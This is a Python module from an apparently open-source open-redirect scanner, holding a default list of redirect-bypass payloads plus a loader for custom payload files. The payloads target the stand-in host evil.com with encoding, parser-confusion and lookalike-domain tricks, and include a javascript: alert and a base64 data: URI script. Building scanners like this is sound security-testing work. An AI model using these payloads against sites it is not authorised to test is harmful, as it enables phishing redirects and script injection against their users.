"""
Payloads module for the Hopper open redirect scanner.
Contains a collection of payloads for testing open redirect vulnerabilities.
"""

import logging
import os

logger = logging.getLogger("hopper")

class OpenRedirectPayloads:
    """Class to manage open redirect payloads."""
    
    def __init__(self, custom_payload_file=None):
        """Initialize with default payloads and optionally load custom payloads."""
        self.payloads = self._get_default_payloads()
        
        # Load custom payloads if specified
        if custom_payload_file:
            self._load_custom_payloads(custom_payload_file)
    
    def _get_default_payloads(self):
        """Return a list of default payloads for open redirect testing."""
        default_payloads = [
            # Basic payloads
            "https://evil.com",
            "//evil.com",
            "https:evil.com",
            "http://evil.com",
            
            # Evasion techniques with common domains
            "https://google.com@evil.com",
            "https://evil.com%2Egoogle.com",
            "https://evil.com%252Egoogle.com",
            "https://evil.com%23.google.com",
            "https://evil.com%09.google.com",
            
            # DNS resolution bypass
            "https://evil%E3%80%82com",
            
            # Advanced evasion
            "javascript:alert(document.domain)",
            "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+",
            "\\/\\/evil.com",
            "/%09/evil.com",
            
            # Protocol bypass
            "http:evil.com",
            
            # Backslash techniques
            "http:\\\\evil.com",
            "http:\\\\evil.com\\",
            "http:\\/\\/evil.com",
            
            # /@/ bypass
            "https://google.com/@evil.com",
            "https://evil.com%2f@google.com",
            
            # Domain confusion
            "https://evil.com.google.com",
            "https://google.com.evil.com",
            "https://google.com%40evil.com",
            
            # WhiteSpace/Tab bypass
            "https://evil.com/favicon.ico%20%23",
            "https://evil.com/%20/google.com",
            "https://evil.com%09.google.com",
            
            # Dot bypass
            "https://evil.com.",
            "https://evil.com。",
            
            # Path traversal
            "https://evil.com/..;/google.com",
            
            # Parameters confusion
            "https://evil.com?google.com",
            "https://evil.com&google.com",
            
            # Fragment bypass
            "https://evil.com#google.com",
            
            # Obscure protocols
            "gopher://evil.com",
            "ftp://evil.com",
            
            # IP address payloads
            "https://127.0.0.1",
            "https://0.0.0.0",
            "https://localhost",
            "https://[::1]",
            
            # Double-URL encoding
            "https%253A%252F%252Fevil.com",
            
            # Unicode/UTF-8 normalization
            "https://xn--80ak6aa92e.com",  # IDN domain
            "https://evil.c%D0%BEm",
            
            # Advanced parser confusion
            "https:/\/\evil.com",
            
            # CRLF bypass
            "https://evil.com%0D%0A",
            "https://evil.com%0A",
            
            # Scheme mixing
            "https://https://evil.com",
            
            # Advanced bypasses for specific cases
            "@evil.com",
            ";@evil.com",
            "https://evil.com;.google.com"
        ]
        
        return default_payloads
    
    def _load_custom_payloads(self, payload_file):
        """Load custom payloads from a file."""
        try:
            if not os.path.exists(payload_file):
                logger.error(f"Payload file not found: {payload_file}")
                return
                
            with open(payload_file, 'r') as f:
                custom_payloads = [line.strip() for line in f if line.strip() and not line.startswith('#')]
                
            logger.info(f"Loaded {len(custom_payloads)} custom payloads from {payload_file}")
            
            # Add custom payloads to existing ones
            self.payloads.extend(custom_payloads)
            
            # Remove duplicates while preserving order
            seen = set()
            self.payloads = [p for p in self.payloads if not (p in seen or seen.add(p))]
            
        except Exception as e:
            logger.error(f"Error loading custom payloads: {str(e)}")
    
    def get_payloads(self):
        """Return the list of payloads."""
        return self.payloads
